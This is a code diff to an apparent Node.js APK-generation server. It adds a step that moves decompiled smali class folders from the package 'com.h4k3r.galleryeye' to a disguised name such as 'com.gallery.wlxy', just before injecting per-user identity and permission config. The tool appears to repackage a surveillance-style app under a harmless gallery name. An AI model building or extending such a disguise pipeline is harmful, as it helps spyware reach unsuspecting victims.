@@ -183,6 +183,49 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             updateSmaliFiles(path.join(workDir, 'smali_classes2'));
             updateSmaliFiles(path.join(workDir, 'smali_classes3'));
 
+            // 2.7. Physically rename smali directories to match new package name
+            // Without this, Android can't find classes at runtime (directory path = class path)
+            const oldPathSegments = oldPackageName.split('.'); // ['com', 'h4k3r', 'galleryeye']
+            const newPathSegments = newPackageName.split('.'); // ['com', 'gallery', 'wlxy']
+
+            const renameSmaliFolders = (baseSmaliDir) => {
+                const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
+                const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);
+
+                if (!fs.existsSync(oldSmaliPath)) return;
+
+                // Create new directory structure
+                fs.mkdirSync(newSmaliPath, { recursive: true });
+
+                // Move all files from old to new
+                const entries = fs.readdirSync(oldSmaliPath, { withFileTypes: true });
+                for (const entry of entries) {
+                    const oldEntryPath = path.join(oldSmaliPath, entry.name);
+                    const newEntryPath = path.join(newSmaliPath, entry.name);
+                    fs.renameSync(oldEntryPath, newEntryPath);
+                }
+
+                // Remove old empty directories (walk up from deepest)
+                try {
+                    // Remove 'galleryeye' dir
+                    fs.rmdirSync(oldSmaliPath);
+                    // Remove 'h4k3r' dir if empty
+                    const parentDir = path.dirname(oldSmaliPath);
+                    if (fs.existsSync(parentDir) && fs.readdirSync(parentDir).length === 0) {
+                        fs.rmdirSync(parentDir);
+                    }
+                } catch (e) {
+                    // Not critical if cleanup fails
+                    console.log(`[APK] Note: Could not clean old smali dir: ${e.message}`);
+                }
+
+                console.log(`[APK] Smali dir renamed: ${oldSmaliPath} -> ${newSmaliPath}`);
+            };
+
+            renameSmaliFolders(path.join(workDir, 'smali'));
+            renameSmaliFolders(path.join(workDir, 'smali_classes2'));
+            renameSmaliFolders(path.join(workDir, 'smali_classes3'));
+
             // 3. Inject Config with permission flags
             await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
             const assetsDir = path.join(workDir, 'assets');
